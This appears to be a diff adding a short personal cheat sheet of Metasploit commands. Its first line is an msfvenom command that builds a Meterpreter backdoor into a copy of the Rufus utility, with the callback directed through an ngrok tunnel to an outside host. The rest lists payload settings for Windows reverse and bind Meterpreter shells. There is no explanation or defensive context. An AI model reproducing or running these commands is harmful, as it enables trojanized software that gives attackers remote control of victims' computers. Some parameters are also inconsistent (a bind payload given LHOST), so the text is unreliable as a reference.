@@ -1,0 +1,15 @@
+msfvenom -p windows/x64/meterpreter/bind_tcp   LHOST=0.tcp.ngrok.io LPORT=17396  -x /storage/sdcard1/kali1/files/rufus.exe  -f exe-only > /root/rufus1.exe
+
+
+Windows 32
+
+set payload windows/meterpreter/reverse_tcp
+
+Windows64
+
+set payload windows/x64/meterpreter/reverse_tcp
+
+Shell inject
+
+set payload windows/x64/meterpreter/bind_tcp
+
